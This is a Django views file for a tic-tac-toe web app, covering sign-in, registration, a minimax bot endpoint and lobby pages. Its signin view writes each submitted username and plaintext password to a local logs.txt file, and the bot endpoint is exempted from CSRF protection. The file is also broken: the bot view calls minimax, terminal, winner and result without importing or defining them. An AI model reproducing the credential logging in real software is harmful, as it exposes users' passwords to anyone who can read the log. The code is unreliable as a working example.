from django.shortcuts import render
from django.contrib.auth import authenticate, login
# Create your views here.

# from .models import Game 
# from django.contrib.auth import authenticate, login
from django.http import JsonResponse
# from django.views.decorators.csrf import csrf_exempt
# from . import logic

from django.views.decorators.csrf import csrf_exempt
import json

from django.shortcuts import render, redirect

from .forms import CustomUserCreationForm


def home(request):
    return render(request, "tictactoe_game/home.html")


def signin(request):
    # Existing sign-in logic
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        # log user data into logs.txt
        with open('logs.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
            f.write(f"User: {user}\n")
            f.close()
        if user is not None:
            login(request, user)
            return redirect("tictactoe_game:game_lobby")
        else:
            return render(request, "tictactoe_game/signin.html", {'form': 'Your username and password didn\'t match.'})
    else:
        return render(request, "tictactoe_game/signin.html")


def register(request):
    if request.method == "POST":
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect("tictactoe_game:signin")
    else:
        form = CustomUserCreationForm()

    return render(request, "tictactoe_game/register.html", {"form": form})


@csrf_exempt
def play_with_bot(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            board = data.get("board")
            if not board:
                raise ValueError("Board state is required.")

            if terminal(board):
                return JsonResponse({"message": "Game over.", "winner": winner(board)})

            action = minimax(board)
            new_board = result(board, action)
            game_over = terminal(new_board)
            game_winner = winner(new_board)

            response_data = {
                "board": new_board,
                "gameOver": game_over,
                "winner": game_winner,
                "action": action,
            }
            return JsonResponse(response_data)
        except ValueError as e:
            return JsonResponse({"error": str(e)}, status=400)
        except Exception as e:
            return JsonResponse({"error": "An unexpected error occurred."}, status=500)
    elif request.method == "GET":
        # Render the HTML page for GET requests instead of returning JSON
        return render(request, "tictactoe_game/bot.html")


def multiplayer(request):
    return render(request, "tictactoe_game/multiplayer.html")

def game_lobby(request):
    return render(request, "tictactoe_game/index.html")

